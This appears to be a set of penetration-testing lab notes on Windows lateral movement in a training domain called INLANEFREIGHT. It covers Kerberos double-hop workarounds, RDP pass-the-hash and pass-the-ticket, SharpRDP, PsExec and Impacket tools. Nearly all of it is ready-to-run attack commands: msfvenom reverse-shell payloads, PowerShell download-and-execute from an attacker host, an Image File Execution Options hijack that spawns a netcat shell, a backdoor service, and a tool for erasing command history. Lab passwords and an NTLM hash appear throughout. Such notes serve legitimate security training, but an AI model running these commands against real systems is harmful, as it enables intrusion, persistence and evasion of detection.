## **Kerberos "Double Hop" Problem**
#### **Workaround #1: PSCredential Object**
1. Try to execute a command: `*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1`
2. Check with klist: `*Evil-WinRM* PS C:\Users\backupadm\Documents> klist`
3. Set up a PSCredential object and try again to execute a command: 
    1. `*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
    2. `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`
    3. `*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname`
#### **Workaround #2: Register PSSession Configuration**
1. Establishing a WinRM session on the remote host: `Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`
2. Check tickets with klist: `klist`
3. One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet: `Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm`
4. Restart the WinRM service by typing `Restart-Service WinRM` in current PSSession.
5. Check again with `klist` and the double hop problem has been eliminated.
## **RDP**
1. RDP Enumeration: `netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local`
2. Optimizing xfreerdp for Low Latency Networks or Proxy Connections: `xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache`
3. Confirm if Restricted Admin Mode is enabled: `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin`
4. o enable Restricted Admin Mode, we would set the DisableRestrictedAdmin value to 0: `reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD`
5. To perform Pass the Hash from a Linux machine, we can use xfreerdp with the /pth option to use a hash and connect to RDP: `proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52`
6. For Pass the Ticket we can use Rubeus:
    1. `.\Rubeus.exe createnetonly /program:powershell.exe /show`
    2. `.\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt`
    3. From the window where we imported the ticket, we can use the mstsc /restrictedAdmin command: `mstsc.exe /restrictedAdmin`
#### **SharpRDP**
1. Execute Metasploit to listen on port 8888: `msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"`
2. Generate a payload with msfvenom using PowerShell Reflection: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s`
3. Use python http server to host our payload: `sudo python3 -m http.server 80`
4. Now we can use SharpRDP to execute a powershell command to execute our payload and provide a session: `.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88`
5. Use [CleanRunMRU](https://github.com/0xthirteen/CleanRunMRU) to clean all command records:
    1. Get the tool: `wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs`
    2. Use csc.exe to compile it: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs`
    3. Use CleanRunMRU.exe to clear all commands: `.\CleanRunMRU.exe  clearall`
## **Server Message Block (SMB)**
1. SMB Enumeration: `proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn`
2. Use PsExec to connect to a remote host and execute commands interactivelly: `.\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd`
3. To execute our payload as NT AUTHORITY\SYSTEM, we need to specify the option -s which means that it will run with SYSTEM privileges: `.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd`
4. Perform lateral movement with SharpNoPSExec:
    1. Start listening with Netcat: `nc -lnvp 8080`
    2. Generate the reverse shell payload using https://www.revshells.com or our fother C2.
    3. Run SharpNoPSExec`.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="`
5. Nimexec works simillary to SharpNoPSExec:
    1. Start listening with Netcat: `nc -lnvp 8080`
    2. Generate the reverse shell payload using revshells.com, and to convert the plain text password to NTLM hash, we can use this recipe in CyberChef: `.\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v`
6. Reg.exe: 
    1. Set up an SMB server to host our payload: `sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe`
    2.  Execute our Netcat listener: `nc -lnvp 8080`
    3. Execute reg.exe to add a new registry key to Microsoft Edge (msedge.exe): `reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"`
    4. Once Microsoft Edge is opened by any user in the domain, we will instantly get a reverse shell.
    5. It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to 1: `reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth`
    6.  If have an account with administrative rights, we can use the following command to allow insecure guest authentication: `reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f`
7. Use psexec.py to get remote code execution on a target host, administrator login credentials are required: `proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52`
8. The smbexec.py method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative: `proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52`
9. The services.py script in Impacket interacts with Windows services using the MSRPC interface: `proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list`
    1. Use the Metasploit output option exe-service, which creates a service binary: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe`
    2. Execute the command to create a new service: `proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"`
    3. Ensure that the SMB server has the file that will be executed: `sudo smbserver.py share -smb2support ./`
    4. Run our Netcat listener: `nc -lnvp 8080`
    5. View the configuration of the custom command created using config -name <serviceName>: `proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'`
    6. Cover up the traces and delete the service by typing delete -name <serviceName>: `proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'`
    7. Alternatively, we use services.py to modify existing services: 
        1. `proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler`
        2. Modify the binary path to our payload and set the START_TYPE to AUTO START with the option -start_type 2: `proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2`
        3. Start the service and wait for our command execution: `proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler`
10. The atexec.py script utilizes the Windows Task Scheduler service, which is accessible through the atsvc SMB pipe:
    1. Start a Netcat listener: `nc -lnvp 8080`
    2. Pass the domain name, administrator user, password, and target IP address <domain>/<user>:<password>@<ip>, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using revshells.com: `proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="`